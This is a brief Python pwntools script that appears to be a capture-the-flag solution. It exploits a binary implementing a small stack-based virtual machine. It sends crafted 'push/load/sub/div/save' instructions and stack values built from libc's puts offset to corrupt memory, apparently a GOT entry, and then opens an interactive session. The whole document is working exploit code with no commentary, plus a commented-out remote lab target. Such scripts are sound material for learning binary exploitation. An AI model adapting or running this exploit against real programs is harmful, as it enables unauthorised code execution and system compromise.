from pwn import *

p = process('./pwn')
#p = remote('a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com',40003)
elf = ELF('./pwn')
libc = ELF('./libc.so')
context.log_level = 'debug'

p.recvuntil('Your program name:\n')
p.sendline('V1NKe')

p.recvuntil('Your instruction:\n')
payload1 = 'push push push load push sub div load push'
payload1 += ' push load sub push load push add push push load'
payload1 += ' push sub div save'
p.sendline(payload1)

p.recvuntil('Your stack data:\n')
puts_addr = libc.symbols['puts']
puts_addr = str(puts_addr)
payload2 = '1 8 -5 4210720 '+puts_addr+' -1 0 987463'
payload2 += ' 8 -8 4210704 '
#gdb.attach(p,'b *0x4019B7')
p.sendline(payload2)

p.interactive()
